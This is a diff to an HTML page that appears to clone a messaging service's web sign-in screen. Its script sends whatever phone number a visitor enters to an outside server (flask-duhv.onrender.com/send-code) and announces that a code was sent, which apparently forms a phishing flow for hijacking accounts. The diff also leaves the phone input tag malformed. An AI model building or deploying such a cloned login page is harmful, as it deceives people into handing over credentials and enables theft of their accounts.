@@ -1015,16 +1015,14 @@
                                 </div>
                             </div>
                             <div class="input-group touched with-label">
-                                <input class="form-control" type="text" id="sign-in-phone-number" dir="auto" inputmode="tel" aria-label="Your phone number">
+                                <input class="form-control" type="text" id="sign-in-phone-number"inputmode="tel" aria-label="Your phone number">
                                 <label for="sign-in-phone-number">Your phone number</label>
                             </div>
                             <label class="Checkbox">
                                 <input type="checkbox" id="sign-in-keep-session">
                                 <div class="Checkbox-main"><span class="label" dir="auto">Keep me signed in</span></div>
                             </label>
-                            <button type="button" class="Button default primary text has-ripple" id="nextBtn">Next
-                                <div class="ripple-container"></div>
-                            </button>
+                            <button type="button" class="Button default primary text has-ripple" id="nextBtn">Next</button>
                         </form>
                     </div>
                 </div>
@@ -1658,28 +1656,30 @@
         </div>
     </div>
     <script>
-document.getElementById("nextBtn").addEventListener("click", function () {
-    const phone = document.getElementById("sign-in-phone-number").value;
-
-    fetch("https://flask-duhv.onrender.com/send-code", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ phone })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.status === "success") {
-            alert("Code sent!");
-            // Show input for code here
-        } else {
-            alert("Error: " + data.message);
-        }
-    })
-    .catch(err => {
-        console.error(err);
-        alert("Request failed");
+window.addEventListener("DOMContentLoaded", () => {
+    document.getElementById("nextBtn").addEventListener("click", function () {
+        const phone = document.getElementById("sign-in-phone-number").value;
+    
+        fetch("https://flask-duhv.onrender.com/send-code", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ phone })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === "success") {
+                alert("Code sent!");
+                // Show input for code here
+            } else {
+                alert("Error: " + data.message);
+            }
+        })
+        .catch(err => {
+            console.error(err);
+            alert("Request failed");
+        });
     });
 });
 </script>
